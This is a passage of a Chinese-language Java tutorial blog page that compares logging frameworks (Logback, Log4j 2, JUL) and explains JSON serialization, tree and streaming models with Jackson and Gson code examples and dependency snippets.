<li><strong>理由</strong>：这是 Spring Boot 的默认选择，意味着最无缝的集成、最少的配置和最广泛的社区支持。它的性能对于 99% 的应用场景来说都绰绰有余。其配置简单直观，生态成熟稳定。对于绝大多数新项目，这是一个不会出错、高效稳妥的**“黄金组合”**。</li>
</ul>
</li>
<li><strong>高性能场景：<code>SLF4J + Log4j 2</code></strong><ul>
<li><strong>理由</strong>：当你开发的系统对<strong>吞吐量和延迟</strong>有极致要求时（例如，高频交易系统、大规模实时数据处理、大型电商秒杀等），Log4j 2 的异步 Logger (基于 LMAX Disruptor) 能带来显著的性能优势。此外，如果你需要更灵活的配置方式（如 YAML&#x2F;JSON）或其强大的插件扩展能力，Log4j 2 也是一个绝佳的选择。</li>
</ul>
</li>
</ul>
<hr>
<h4 id="6-2-老项目维护"><a href="#6-2-老项目维护" class="headerlink" title="6.2 老项目维护"></a>6.2 老项目维护</h4><ul>
<li><strong>核心任务：评估并迁移</strong>。<ul>
<li>首先，使用 <code>mvn dependency:tree</code> 或类似的工具检查项目当前的日志依赖。</li>
<li>如果项目中仍在使用 <strong>Log4j 1.x</strong>，应将其视为一个<strong>高优先级的安全漏洞和技术债务</strong>，并立即制定迁移计划。</li>
<li>如果项目中存在 JCL (Commons Logging) 或 JUL，最佳实践是使用 SLF4J 的桥接包将其统一到 SLF4J 体系下。</li>
<li>迁移的目标是实现全项目范围的 <strong><code>SLF4J + (Logback 或 Log4j 2)</code></strong> 的统一日志栈。</li>
</ul>
</li>
</ul>
<hr>
<h4 id="6-3-框架对比速查表"><a href="#6-3-框架对比速查表" class="headerlink" title="6.3 框架对比速查表"></a>6.3 框架对比速查表</h4><table>
<thead>
<tr>
<th align="left">特性&#x2F;框架</th>
<th align="left">Logback</th>
<th align="left">Log4j 2</th>
<th align="left">JUL (java.util.logging)</th>
</tr>
</thead>
<tbody><tr>
<td align="left"><strong>门面依赖</strong></td>
<td align="left">SLF4J (原生实现)</td>
<td align="left">SLF4J (官方完美支持)</td>
<td align="left">N&#x2F;A (自身是实现)</td>
</tr>
<tr>
<td align="left"><strong>性能</strong></td>
<td align="left"><strong>非常高</strong></td>
<td align="left"><strong>极致</strong> (尤其在异步模式下)</td>
<td align="left">一般</td>
</tr>
<tr>
<td align="left"><strong>配置灵活度</strong></td>
<td align="left">高 (支持 XML, Groovy)</td>
<td align="left"><strong>非常高</strong> (支持 XML, JSON, YAML, Properties)</td>
<td align="left">低 (主要是 .properties)</td>
</tr>
<tr>
<td align="left"><strong>异步支持</strong></td>
<td align="left">提供 <code>AsyncAppender</code> (基于 <code>BlockingQueue</code>)</td>
<td align="left"><strong>内置异步 Logger (基于 Disruptor, 性能更优)</strong></td>
<td align="left">不支持</td>
</tr>
<tr>
<td align="left"><strong>社区活跃度</strong></td>
<td align="left">非常活跃</td>
<td align="left">非常活跃</td>
<td align="left">低</td>
</tr>
<tr>
<td align="left"><strong>Spring Boot集成</strong></td>
<td align="left"><strong>默认，无缝集成</strong></td>
<td align="left">官方支持，切换简单</td>
<td align="left">不推荐，需要手动桥接</td>
</tr>
<tr>
<td align="left"><strong>核心亮点</strong></td>
<td align="left">稳定可靠, 自动重载配置, <code>SiftingAppender</code></td>
<td align="left">极致异步性能, 插件化架构, 无垃圾(GC-Free)模式</td>
<td align="left">无需外部依赖</td>
</tr>
</tbody></table>
<hr>
<h1 id="二、JSON处理"><a href="#二、JSON处理" class="headerlink" title="二、JSON处理"></a>二、JSON处理</h1><h2 id="1-基础核心概念"><a href="#1-基础核心概念" class="headerlink" title="1. 基础核心概念"></a>1. 基础核心概念</h2><h3 id="1-1-序列化-Serialization"><a href="#1-1-序列化-Serialization" class="headerlink" title="1.1 序列化 (Serialization)"></a>1.1 序列化 (Serialization)</h3><ul>
<li><p><strong>定义</strong>：将一个存在于JVM内存中的Java对象（通常是POJO, Plain Old Java Object）的状态，转换为一种可存储或可传输的格式，如JSON字符串或字节流。这个过程也常被称为“编组”（Marshalling）。</p>
</li>
<li><p><strong>用途</strong>：</p>
<ul>
<li><strong>API响应</strong>：在RESTful API中，服务器将处理结果（如一个<code>User</code>对象）序列化为JSON字符串，作为HTTP响应体返回给客户端。</li>
<li><strong>数据持久化</strong>：将对象序列化后存储到NoSQL数据库（如MongoDB）、缓存（如Redis）或文件中，以便后续恢复。</li>
</ul>
</li>
<li><p><strong>示例 (使用Jackson)</strong>：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 1. 定义一个Java对象 (POJO)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">User</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="type">int</span> id;</span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line">    <span class="comment">// 省略构造函数、getter和setter...</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 2. 创建对象实例并序列化</span></span><br><span class="line"><span class="type">ObjectMapper</span> <span class="variable">objectMapper</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectMapper</span>();</span><br><span class="line"><span class="type">User</span> <span class="variable">user</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">User</span>(<span class="number">1</span>, <span class="string">&quot;Alice&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 将User对象转换为JSON字符串</span></span><br><span class="line"><span class="type">String</span> <span class="variable">jsonString</span> <span class="operator">=</span> objectMapper.writeValueAsString(user);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 输出结果: &#123;&quot;id&quot;:1,&quot;name&quot;:&quot;Alice&quot;&#125;</span></span><br><span class="line">System.out.println(jsonString);</span><br></pre></td></tr></table></figure></li>
</ul>
<hr>
<h3 id="1-2-反序列化-Deserialization"><a href="#1-2-反序列化-Deserialization" class="headerlink" title="1.2 反序列化 (Deserialization)"></a>1.2 反序列化 (Deserialization)</h3><ul>
<li><p><strong>定义</strong>：序列化的逆过程。将JSON格式的字符串或字节流解析，并在JVM内存中重新构建出对应的Java对象。这个过程也常被称为“解组”（Unmarshalling）。</p>
</li>
<li><p><strong>用途</strong>：</p>
<ul>
<li><strong>API请求解析</strong>：服务器接收到客户端POST或PUT请求中的JSON数据，将其反序列化为Java对象，以便在业务逻辑中使用。</li>
<li><strong>数据读取</strong>：从数据库、缓存或文件中读取JSON数据，并将其恢复为程序可以操作的对象。</li>
</ul>
</li>
<li><p><strong>示例 (使用Jackson)</strong>：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">String</span> <span class="variable">jsonString</span> <span class="operator">=</span> <span class="string">&quot;&#123;\&quot;id\&quot;:1,\&quot;name\&quot;:\&quot;Alice\&quot;&#125;&quot;</span>;</span><br><span class="line"><span class="type">ObjectMapper</span> <span class="variable">objectMapper</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectMapper</span>();</span><br><span class="line"></span><br><span class="line"><span class="comment">// 将JSON字符串转换回User对象</span></span><br><span class="line"><span class="type">User</span> <span class="variable">user</span> <span class="operator">=</span> objectMapper.readValue(jsonString, User.class);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 现在可以像普通Java对象一样使用它</span></span><br><span class="line">System.out.println(user.getName()); <span class="comment">// 输出: Alice</span></span><br></pre></td></tr></table></figure></li>
</ul>
<hr>
<h3 id="1-3-数据绑定"><a href="#1-3-数据绑定" class="headerlink" title="1.3 数据绑定"></a>1.3 数据绑定</h3><ul>
<li><strong>描述</strong>：这是一种高级抽象模式，它<strong>自动</strong>在Java对象和JSON数据之间进行映射。前面提到的序列化和反序列化示例，就是数据绑定的具体应用。这是最常用、最便捷的方式。</li>
<li><strong>工作原理</strong>：库通过<strong>反射</strong>或<strong>代码生成</strong>技术，分析Java类的结构（字段名、getter&#x2F;setter），并将其与JSON的键（key）进行匹配。注解（如<code>@JsonProperty</code>）可以用来辅助或覆盖默认的映射规则。</li>
<li><strong>优点</strong>：代码简洁，开发效率高，强类型安全。</li>
<li><strong>缺点</strong>：对于结构不固定的JSON不够灵活；对于超大JSON，一次性加载整个对象可能消耗大量内存。</li>
</ul>
<hr>
<h3 id="1-4-树模型"><a href="#1-4-树模型" class="headerlink" title="1.4 树模型"></a>1.4 树模型</h3><ul>
<li><p><strong>描述</strong>：将JSON数据解析为一个通用的、内存中的树状结构。每个节点都是一个<code>Node</code>对象，代表JSON中的一个元素（如对象、数组、字符串、数字等）。你不必为JSON创建对应的POJO类。</p>
</li>
<li><p><strong>用途</strong>：</p>
<ul>
<li><strong>处理结构不固定的JSON</strong>：当JSON的字段不确定或经常变化时，无法用固定的POJO来绑定。</li>
<li><strong>只需访问部分数据</strong>：当一个庞大的JSON中，你只需要读取或修改其中一两个字段时，使用树模型可以避免创建完整的、复杂的POJO。</li>
</ul>
</li>
<li><p><strong>示例 (使用Jackson的<code>JsonNode</code>)</strong>：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">String</span> <span class="variable">jsonString</span> <span class="operator">=</span> <span class="string">&quot;&#123;\&quot;id\&quot;:1,\&quot;name\&quot;:\&quot;Alice\&quot;,\&quot;details\&quot;:&#123;\&quot;email\&quot;:\&quot;alice@example.com\&quot;&#125;&#125;&quot;</span>;</span><br><span class="line"><span class="type">ObjectMapper</span> <span class="variable">objectMapper</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectMapper</span>();</span><br><span class="line"></span><br><span class="line"><span class="comment">// 将JSON解析为一棵树</span></span><br><span class="line"><span class="type">JsonNode</span> <span class="variable">rootNode</span> <span class="operator">=</span> objectMapper.readTree(jsonString);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 遍历树来获取数据</span></span><br><span class="line"><span class="type">String</span> <span class="variable">name</span> <span class="operator">=</span> rootNode.get(<span class="string">&quot;name&quot;</span>).asText();</span><br><span class="line"><span class="type">String</span> <span class="variable">email</span> <span class="operator">=</span> rootNode.get(<span class="string">&quot;details&quot;</span>).get(<span class="string">&quot;email&quot;</span>).asText();</span><br><span class="line"></span><br><span class="line">System.out.println(<span class="string">&quot;Name: &quot;</span> + name);   <span class="comment">// 输出: Name: Alice</span></span><br><span class="line">System.out.println(<span class="string">&quot;Email: &quot;</span> + email); <span class="comment">// 输出: Email: alice@example.com</span></span><br></pre></td></tr></table></figure></li>
</ul>
<hr>
<h3 id="1-5-流式API"><a href="#1-5-流式API" class="headerlink" title="1.5 流式API"></a>1.5 流式API</h3><ul>
<li><p><strong>描述</strong>：这是最低级别、最底层的处理方式。它将JSON视为一个<strong>事件流</strong>（Token Stream），逐个读取JSON的构成单元（如 <code>{</code> 表示对象开始, <code>}</code> 表示对象结束, <code>key</code> 表示字段名, <code>value</code> 表示值等）。</p>
</li>
<li><p><strong>工作模式</strong>：你通过一个类似迭代器的<code>parser</code>，不断地获取下一个<code>Token</code>，并根据<code>Token</code>的类型来编写处理逻辑。它不会在内存中构建完整的对象或树。</p>
</li>
<li><p><strong>用途</strong>：</p>
<ul>
<li><strong>处理超大JSON文件</strong>：当JSON文件达到GB级别时，数据绑定和树模型都会导致内存溢出（OOM），流式API是唯一可行的选择。</li>
<li><strong>极致性能场景</strong>：因为它避免了反射和创建大量中间对象的开销，是性能最高的方式。</li>
</ul>
</li>
<li><p><strong>示例 (使用Jackson的<code>JsonParser</code>)</strong>：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">String</span> <span class="variable">jsonString</span> <span class="operator">=</span> <span class="string">&quot;&#123;\&quot;id\&quot;:1,\&quot;name\&quot;:\&quot;Alice\&quot;&#125;&quot;</span>;</span><br><span class="line"><span class="type">JsonFactory</span> <span class="variable">factory</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">JsonFactory</span>();</span><br><span class="line"><span class="type">JsonParser</span> <span class="variable">parser</span> <span class="operator">=</span> factory.createParser(jsonString);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 循环遍历JSON的每一个Token</span></span><br><span class="line"><span class="keyword">while</span> (parser.nextToken() != JsonToken.END_OBJECT) &#123;</span><br><span class="line">    <span class="type">String</span> <span class="variable">fieldName</span> <span class="operator">=</span> parser.getCurrentName();</span><br><span class="line">    <span class="keyword">if</span> (<span class="string">&quot;name&quot;</span>.equals(fieldName)) &#123;</span><br><span class="line">        parser.nextToken(); <span class="comment">// 移动到&quot;name&quot;字段的值</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">name</span> <span class="operator">=</span> parser.getText();</span><br><span class="line">        System.out.println(<span class="string">&quot;Found name: &quot;</span> + name); <span class="comment">// 输出: Found name: Alice</span></span><br><span class="line">        <span class="comment">// 找到需要的数据后甚至可以提前终止解析</span></span><br><span class="line">        <span class="keyword">break</span>; </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">parser.close();</span><br></pre></td></tr></table></figure></li>
</ul>
<hr>
<h2 id="2-主流JSON库对比与详解"><a href="#2-主流JSON库对比与详解" class="headerlink" title="2. 主流JSON库对比与详解"></a>2. 主流JSON库对比与详解</h2><h3 id="2-1-Jackson-事实标准"><a href="#2-1-Jackson-事实标准" class="headerlink" title="2.1 Jackson (事实标准)"></a>2.1 Jackson (事实标准)</h3><h4 id="2-1-1-简介-1"><a href="#2-1-1-简介-1" class="headerlink" title="2.1.1 简介"></a>2.1.1 简介</h4><ul>
<li><strong>Spring Boot 默认集成，生态最完善，功能最强大。</strong><br>在Java后端领域，Jackson被广泛认为是处理JSON的“事实标准”。<code>spring-boot-starter-web</code> 依赖项默认就包含了Jackson。这意味着，当你创建一个Spring Boot Web项目时，无需任何额外配置，就可以直接使用Jackson进行JSON的序列化和反序列化。这种无缝集成是其流行的关键原因之一。</li>
<li><strong>由三个核心模块构成，各司其职：</strong><ul>
<li><code>jackson-core</code>: 项目的核心基础。它提供了底层的流式API（<code>JsonParser</code>, <code>JsonGenerator</code>）和核心定义（<code>JsonToken</code>等）。它本身不提供数据绑定功能。</li>
<li><code>jackson-annotations</code>: 包含了一套标准的注解。这些注解独立于具体的数据格式，既可以用于JSON，也可以通过扩展模块用于XML、CSV等。</li>
<li><code>jackson-databind</code>: 这是我们最常使用的模块。它构建在<code>core</code>和<code>annotations</code>之上，提供了强大的数据绑定（通过<code>ObjectMapper</code>）和树模型（通过<code>JsonNode</code>）功能，极大地简化了开发。</li>
</ul>
</li>
</ul>
<hr>
<h4 id="2-1-2-核心特性"><a href="#2-1-2-核心特性" class="headerlink" title="2.1.2 核心特性"></a>2.1.2 核心特性</h4><ul>
<li><p><strong>性能优异</strong><br>Jackson经过了长时间的优化，其性能在众多库中名列前茅。关键在于，<strong><code>ObjectMapper</code>实例是线程安全的，但创建成本较高。因此，最佳实践是将其声明为单例或可复用的实例</strong>，而不是在每次操作时都<code>new ObjectMapper()</code>。</p>
</li>
<li><p><strong>功能全面，支持所有三种处理模式</strong></p>
<ul>
<li><p><strong>数据绑定 (最常用)</strong>:</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">ObjectMapper</span> <span class="variable">mapper</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectMapper</span>();</span><br><span class="line"><span class="comment">// 序列化</span></span><br><span class="line"><span class="type">String</span> <span class="variable">json</span> <span class="operator">=</span> mapper.writeValueAsString(<span class="keyword">new</span> <span class="title class_">MyUser</span>(<span class="number">1</span>, <span class="string">&quot;Bob&quot;</span>)); <span class="comment">// -&gt; &#123;&quot;id&quot;:1,&quot;name&quot;:&quot;Bob&quot;&#125;</span></span><br><span class="line"><span class="comment">// 反序列化</span></span><br><span class="line"><span class="type">MyUser</span> <span class="variable">user</span> <span class="operator">=</span> mapper.readValue(json, MyUser.class);</span><br></pre></td></tr></table></figure>
</li>
<li><p><strong>树模型 (灵活性高)</strong>:</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">String</span> <span class="variable">jsonStr</span> <span class="operator">=</span> <span class="string">&quot;&#123;\&quot;name\&quot;:\&quot;Charlie\&quot;,\&quot;age\&quot;:30&#125;&quot;</span>;</span><br><span class="line"><span class="type">JsonNode</span> <span class="variable">rootNode</span> <span class="operator">=</span> mapper.readTree(jsonStr);</span><br><span class="line"><span class="type">String</span> <span class="variable">name</span> <span class="operator">=</span> rootNode.get(<span class="string">&quot;name&quot;</span>).asText(); <span class="comment">// -&gt; &quot;Charlie&quot;</span></span><br><span class="line"><span class="type">int</span> <span class="variable">age</span> <span class="operator">=</span> rootNode.get(<span class="string">&quot;age&quot;</span>).asInt(); <span class="comment">// -&gt; 30</span></span><br></pre></td></tr></table></figure>
</li>
<li><p><strong>流式API (处理超大文件)</strong>:</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 概念性示例，用于读取一个巨大的JSON数组</span></span><br><span class="line"><span class="keyword">try</span> (<span class="type">JsonParser</span> <span class="variable">parser</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">JsonFactory</span>().createParser(<span class="keyword">new</span> <span class="title class_">File</span>(<span class="string">&quot;large.json&quot;</span>))) &#123;</span><br><span class="line">    <span class="keyword">if</span> (parser.nextToken() == JsonToken.START_ARRAY) &#123;</span><br><span class="line">        <span class="keyword">while</span> (parser.nextToken() == JsonToken.START_OBJECT) &#123;</span><br><span class="line">            <span class="comment">// 将每个对象单独映射，而不是整个列表，以节省内存</span></span><br><span class="line">            <span class="type">MyUser</span> <span class="variable">user</span> <span class="operator">=</span> mapper.readValue(parser, MyUser.class);</span><br><span class="line">            <span class="comment">// process(user)...</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
</ul>
</li>
<li><p><strong>注解功能强大，可精细化控制</strong></p>
<ul>
<li><code>@JsonProperty(&quot;user_name&quot;)</code>: 指定JSON中的字段名。</li>
<li><code>@JsonIgnore</code>: 在序列化和反序列化时完全忽略该字段。</li>
<li><code>@JsonInclude(JsonInclude.Include.NON_NULL)</code>: 仅在字段值不为<code>null</code>时才将其序列化。</li>
<li><code>@JsonFormat(shape = JsonFormat.Shape.STRING, pattern = &quot;yyyy-MM-dd HH:mm:ss&quot;)</code>: 格式化日期类型。</li>
<li><code>@JsonUnwrapped</code>: 将一个内嵌对象的属性“拍平”到父对象中。</li>
<li><code>@JsonCreator</code> 和 <code>@JsonProperty</code>: 配合使用，可以支持从JSON创建不可变对象（Immutable Object）。</li>
</ul>
</li>
<li><p><strong>高度可定制化，扩展性极强</strong></p>
<ul>
<li><strong><code>Module</code></strong>: Jackson的“插件”机制。你可以通过注册<code>Module</code>来添加对新数据类型（如Java 8的<code>Optional</code>、<code>LocalDate</code>）的支持，或者添加自定义的序列化&#x2F;反序列化逻辑。例如 <code>JavaTimeModule</code> 就是一个必装的模块。</li>
<li><strong>自定义 <code>JsonSerializer</code> 和 <code>JsonDeserializer</code></strong>: 当注解无法满足复杂的转换需求时，可以编写自己的序列化器和反序列化器，实现任何你想要的逻辑。例如，将一个枚举序列化为一个包含<code>code</code>和<code>message</code>的JSON对象。</li>
</ul>
</li>
</ul>
<hr>
<h4 id="2-1-3-Maven-Gradle-依赖"><a href="#2-1-3-Maven-Gradle-依赖" class="headerlink" title="2.1.3 Maven&#x2F;Gradle 依赖"></a>2.1.3 Maven&#x2F;Gradle 依赖</h4><ul>
<li><p><strong>Maven</strong>:</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- For Maven --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.fasterxml.jackson.core<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>jackson-databind<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>2.15.2<span class="tag">&lt;/<span class="name">version</span>&gt;</span> <span class="comment">&lt;!-- 使用最新稳定版 --&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!-- 强烈推荐：添加对Java 8日期和时间API的支持 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.fasterxml.jackson.datatype<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>jackson-datatype-jsr310<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>2.15.2<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure>
</li>
<li><p><strong>Gradle</strong>:</p>
<figure class="highlight groovy"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// For Gradle</span></span><br><span class="line">implementation <span class="string">&#x27;com.fasterxml.jackson.core:jackson-databind:2.15.2&#x27;</span> <span class="comment">// 使用最新稳定版</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 强烈推荐：添加对Java 8日期和时间API的支持</span></span><br><span class="line">implementation <span class="string">&#x27;com.fasterxml.jackson.datatype:jackson-datatype-jsr310:2.15.2&#x27;</span></span><br></pre></td></tr></table></figure>

<p><em>注：在Spring Boot项目中，这些依赖通常由<code>spring-boot-starter-json</code>统一管理，无需手动指定版本。</em></p>
</li>
</ul>
<hr>
<h4 id="2-1-4-适用场景"><a href="#2-1-4-适用场景" class="headerlink" title="2.1.4 适用场景"></a>2.1.4 适用场景</h4><ul>
<li><strong>所有Spring Boot项目（首选）</strong>：作为开箱即用的默认选项，与框架深度集成，是构建RESTful服务的最佳选择。</li>
<li><strong>需要复杂定制化和高级功能的场景</strong>：当需要处理非标准JSON、与遗留系统对接、或在序列化&#x2F;反序列化过程中嵌入业务逻辑时，Jackson强大的定制化能力无人能及。</li>
<li><strong>构建需要长期维护的企业级应用</strong>：其庞大的社区、丰富的文档和久经考验的稳定性，使其成为构建健壮、可扩展系统的可靠基石。</li>
<li><strong>对性能有较高要求的项目</strong>：虽然Fastjson2在某些基准测试中可能更快，但Jackson的性能已经足够优秀，能够满足绝大多数高并发应用的需求。</li>
</ul>
<hr>
<h3 id="2-2-Gson-Google出品"><a href="#2-2-Gson-Google出品" class="headerlink" title="2.2 Gson (Google出品)"></a>2.2 Gson (Google出品)</h3><h4 id="2-2-1-简介-1"><a href="#2-2-1-简介-1" class="headerlink" title="2.2.1 简介"></a>2.2.1 简介</h4><ul>
<li><strong>由Google开发，API设计简洁优雅。</strong><br>Gson是Google推出的一个开源Java库，其设计哲学是“简洁至上”。与Jackson的“全能”定位不同，Gson专注于提供一套简单、直观的API来完成最核心的JSON处理任务。它的入口类<code>Gson</code>和配置类<code>GsonBuilder</code>非常易于理解和使用。</li>
<li><strong>在Android开发和非Spring项目中非常流行。</strong><br>由于其轻量级、无额外依赖以及早期的生态优势，Gson成为了Android平台事实上的标准JSON库。在非Spring的Java后端项目中，如果不需要Jackson那样复杂的定制功能，Gson凭借其极低的上手门槛，也备受青睐。</li>
</ul>
<hr>
<h4 id="2-2-2-核心特性"><a href="#2-2-2-核心特性" class="headerlink" title="2.2.2 核心特性"></a>2.2.2 核心特性</h4><ul>
<li><p><strong>API简单易用，上手快。</strong><br>Gson的核心API非常精炼。通常，你只需要创建一个<code>Gson</code>对象，然后调用<code>toJson()</code>或<code>fromJson()</code>即可。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 1. 创建Gson实例 (Gson实例是线程安全的，可以复用)</span></span><br><span class="line"><span class="type">Gson</span> <span class="variable">gson</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Gson</span>();</span><br><span class="line"><span class="type">User</span> <span class="variable">user</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">User</span>(<span class="number">1</span>, <span class="string">&quot;Grace&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 2. 序列化: 对象 -&gt; JSON字符串</span></span><br><span class="line"><span class="type">String</span> <span class="variable">jsonString</span> <span class="operator">=</span> gson.toJson(user);</span><br><span class="line"><span class="comment">// -&gt; &#123;&quot;id&quot;:1,&quot;name&quot;:&quot;Grace&quot;&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 3. 反序列化: JSON字符串 -&gt; 对象</span></span><br><span class="line"><span class="type">User</span> <span class="variable">deserializedUser</span> <span class="operator">=</span> gson.fromJson(jsonString, User.class);</span><br></pre></td></tr></table></figure>
</li>
<li><p><strong>无需空的构造函数即可反序列化。</strong><br>这是Gson与Jackson的一个显著区别。Jackson默认需要一个无参构造函数来创建对象实例，然后再通过setter或反射填充字段。而Gson在无法找到无参构造函数时，会尝试使用内部的“不安全”方法（如<code>sun.misc.Unsafe</code>）直接在内存中创建对象实例，并绕过构造函数来填充字段。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ImmutableUser</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> <span class="type">int</span> id;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> String name;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 只有带参构造函数，没有无参构造函数</span></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">ImmutableUser</span><span class="params">(<span class="type">int</span> id, String name)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.id = id;</span><br><span class="line">        <span class="built_in">this</span>.name = name;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// ... getters</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">String</span> <span class="variable">json</span> <span class="operator">=</span> <span class="string">&quot;&#123;\&quot;id\&quot;:10,\&quot;name\&quot;:\&quot;Hopper\&quot;&#125;&quot;</span>;</span><br><span class="line"><span class="type">Gson</span> <span class="variable">gson</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Gson</span>();</span><br><span class="line"></span><br><span class="line"><span class="comment">// Gson可以成功反序列化这个没有无参构造函数的类</span></span><br><span class="line"><span class="type">ImmutableUser</span> <span class="variable">user</span> <span class="operator">=</span> gson.fromJson(json, ImmutableUser.class);</span><br><span class="line">System.out.println(user.getName()); <span class="comment">// -&gt; Hopper</span></span><br></pre></td></tr></table></figure>

<p><strong>注意</strong>：虽然方便，但这可能绕过你在构造函数中设置的验证逻辑，使用时需了解其行为。</p>
</li>
